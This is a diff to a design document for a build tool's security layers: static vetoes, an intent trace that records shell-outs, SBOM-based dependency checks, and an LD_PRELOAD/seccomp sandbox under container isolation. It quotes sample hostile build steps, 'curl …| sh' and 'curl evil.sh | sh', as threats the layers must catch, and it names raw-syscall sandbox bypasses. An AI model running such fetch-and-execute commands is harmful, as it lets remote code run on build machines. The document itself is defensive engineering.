-   grep — no longer needed; the positive coordinate allowlist is shipped.)
-5. ~~**Tier C spike** — the `--lib` doppelganger that records build intent
-   instead of executing.~~ **SHIPPED (2026-06-10).** `aeb --trace-intent
-   [--intent-json <path>]` compiles+runs the leaf against a **doppelganger
-   `std.os`** (`lib/veto_trace_os`) whose `os.system`/`os.exec`/`os.run*`
-   **RECORD** the command to a trace file instead of **EXECUTING** it, then
-   emits the recorded intent as JSON (`{"system":[…],"exec":[…],"run":[…]}`).
-   The Action!/`--lib` trick, realized with **no aether change and no SDK
-   edits**: `std.os` is the *universal shell-out chokepoint* — every SDK
-   (gcc/javac/cargo/curl) routes through it, so one shadowed lib captures the
-   whole build's intent. (`tools/aeb-trace` stages the doppelganger `std/`,
-   `transform-ae`s the `aeb(cap)` node, wraps it in a `main()` harness, and
-   compiles with a **cwd-local `--lib .`** — the only form that shadows the
-   builtin stdlib.) Live-verified: an evil `.build.ae` doing `os.system("curl
-   …| sh")` → the curl is **recorded, not run** (no exfil), the JSON drives a
-   `--vet-tool` veto. **Honest limits (as designed):** orchestration only
-   (never the compiled app), ONE path (the branch this run takes), opaque
-   computation records `<computed>` (treat opacity as a vetoable signal). A
-   strong veto INPUT for build-grammar escapes, complementary to 2b's
-   AST/symbol view — not a soundness proof. **Next:** record `dep`/`link_flag`/
-   `std.net` categories too (currently captures the `os.*` shell-out surface);
-   full orchestrator integration so a whole-tree `--trace-intent` walks the DAG.
-6. ~~**Tier B** — a `--resolve-only`/meta-emit mode exposing the resolved
-   coordinate closure to a CVE/banned-dep veto without a full build.~~
-   **SHIPPED (2026-06-10, maven slice).** `aeb --resolve-only [--sbom-json
-   <path>]` resolves the target's declared coordinates to their full
-   **transitive closure** and emits it as JSON (`{"maven":["g:a:v",…]}`)
-   **without building** — `tools/aeb-sbom` greps the coordinate `dep()`s
-   statically (no build execution; the veto philosophy) and runs the existing
-   `aeb-resolve.jar` with the new `--output sbom` mode (one G:A:V per resolved
-   artifact, sorted+deduped). aeb emits the SBOM; the **verdict is delegated to
-   a scanner** via `--vet-tool` (the 1b principle — "aeb invokes a SAST engine
-   rather than becoming one"): `aeb --vet-tool 'grype sbom:out.json --fail-on
-   high'`. This catches the *which dependency versions* class (known-CVE,
-   banned) that the AST veto and sandbox can't see — they inspect build
-   *behaviour*, not resolved versions. Live-verified: `jackson-databind:2.9.0`
-   → its transitive closure (annotations+core+databind) emitted, a scanner
-   reading the SBOM vetoes through `--vet-tool` (REFUSED, exit 3), a clean
-   version (`2.15.0`) clears. **Next:** cargo (`.crate.ae`) + npm (`npm:…`)
-   slices follow the same shape; an `--output sbom` for those ecosystems'
-   resolvers.
+## Veto is policy; containment is enforcement — they are different layers
+
+The static vetoes are **policy gates** — they inspect (the tree, the resolved
+closure, a recorded trace, the AST) and *decide* whether to proceed. That makes
+them fundamentally **bounded by what they can read.** A `.build.ae` doing
+`os.system(decode(blob))` records `os.system(<computed>)`; a build that
+*computes* `curl evil.sh | sh` at runtime is invisible to every reader here.
+That is not a gap to be closed by a smarter veto — it is the nature of a
+read-and-decide gate.
+
+What *does* close it is **containment** — enforcing limits on the running build
+at a layer it cannot reason its way around. Three containment surfaces, stacked
+as defense in depth, each catching what the layer above is blind to:
+
+| Layer | Mechanism | Catches | Blind to |
+|---|---|---|---|
+| **Static vetoes** (policy; pre-build) | tree-scan / external-tool / AST / SBOM / intent-trace | *declared / readable* build-grammar escapes | computed/opaque escapes; the compiled artifact |
+| **Aether sandbox** (per-process; LD_PRELOAD + seccomp) | `spawn_sandboxed(grants, …)` | *runtime* fs/exec/tcp/env/fork attempts by the build **and its children** — including computed ones the veto couldn't read | a statically-linked tool issuing raw syscalls the preload can't see; the artifact's later behaviour |
+| **Container / OS** (kernel namespaces, caps, netns) | `itests/agent-container` hardening | everything that escapes the preload — kernel-level blast radius | (this is the floor) |
+
+### The runtime sandbox (`--sandbox [--sandbox-profile <f>]`)
+
+`aeb --sandbox` runs the whole build under Aether's `spawn_sandboxed` with a
+deny-by-default grant profile. Because `spawn_sandboxed` sets `LD_PRELOAD` +
+the grant-SHM in the child's env before exec, and the `execve` interceptor
+re-checks every subsequent exec, **one spawn contains the entire build
+subtree** — `aeb → gcc → cc1`, `aeb → javac`, etc. all run under the same
+grants, each `connect()`/`open()`/`execve()`/`fork()` checked. A denied syscall
+(connect to an un-granted host, write outside `target/`, exec off the
+allowlist) dies at the boundary regardless of how the build computed it. That
+is what makes "a clean veto is not a clean program" survivable.
+
+Grants are `(category, pattern)` pairs: `fs_read`, `fs_write`, `exec`, `tcp`,
+`tcp_listen`, `env`, `fork`, `native` (`lib/sandbox`). The profile resolves
+out-of-tree (`--sandbox-profile` → `$AEB_HOME/sandbox/default.ae` →
+conservative built-in, **no tcp**), an in-tree profile is refused, and the
+maintainer (in-tree) can only **narrow** within the operator ceiling
+(`sandbox.intersect` — the operator-ceiling ∩ maintainer-request model; see
+[`capability-entrypoint.md`](capability-entrypoint.md)). A profile that resolves
+to zero grants, or is grant-all, is flagged.
+
+Two enforcement details worth stating:
+
+- **Kernel-level fork fence (aether ≥ 0.230.0).** The `fork`/process-creation
+  denial is a **seccomp-bpf filter** installed post-fork/pre-exec — not just an
+  LD_PRELOAD libc-symbol intercept, which was bypassable by a raw
+  `syscall(SYS_clone3, …)` or glibc's inline `__vfork`. gcc uses exactly those
+  paths to spawn `cc1`/`as`/`ld`, so before the fence a no-`fork` grant didn't
+  actually stop process creation. Now it does, at the kernel, fail-closed.
+- **Linux-only.** `spawn_sandboxed` is `fork`/`shm_open`/`LD_PRELOAD`/seccomp;
+  on non-Linux `--sandbox` refuses (use the container/VM layer there). It is
+  the *middle* layer — a statically-linked tool issuing raw syscalls, or
+  resource exhaustion (fork-bomb, fill the disk), is the container layer's job.
+
+### Where the build is hosted — `aeb(cap)`
+
+Under `--sandbox` the build leaf is hosted as an Aether lib (no binary `main`)
+and aeb calls its exported `aeb(cap)` in-process, passing the operator-minted
+capability — the build *receives* its authority, never constructs it. The grant
+grammar is the honest layer; the LD_PRELOAD/seccomp enforcement is the
+un-forgeable fence. Full design + the no-pre-entry-execution finding that makes
+it sound: [`capability-entrypoint.md`](capability-entrypoint.md).
+
+---
+
+## A vetoed build is a refusal, not a failure
+
+Every gate distinguishes **refused-on-policy** from **ran-and-broke**:
+`aeb --vet` exits **3** (refused) before any build; the agent returns a
+distinct `vetoed`/HTTP 422. The originator can tell "this agent's policy
+refused your build" from "your build ran and failed." Run cheap→expensive so a
+blatant tree-scan hit short-circuits before the costly resolve/trace work; the
+first refusal wins.
 
 ## The one-line summary
 
-`maybe_veto_build` guards the **build's behaviour**, tier C does it with the
-Action!/designer "interpret into a doppelganger via `--lib`" trick (cheap
-in aeb because `--lib` swaps the library with no impedance) — but it guards
-**build-grammar escapes, never the application being built.** A clean veto
-is not a clean program. Keep that boundary bright.
-
-And remember the veto is only the *policy* layer: it decides on what it can
-read. The thing that survives a build it *can't* read — a computed escape, an
-opaque command — is **containment**, and Aether's `spawn_sandboxed` is the
-already-shipped middle layer that contains the whole `aeb <target>` subtree
-at the libc boundary, with the container/namespace layer below it. Veto +
-sandbox + container, stacked — not the veto alone.
+The static vetoes guard the **build's behaviour** — its declared/readable
+escapes — but **never the application being built.** A clean veto is not a
+clean program; keep that boundary bright. The thing that survives a build the
+veto *can't read* (a computed escape, an opaque command) is **containment**,
+and the `spawn_sandboxed` sandbox is the layer that contains the whole subtree
+at the libc/kernel boundary, with the container/namespace layer below it. Veto
+decides *what may build*; the sandbox decides *what a build may do*.
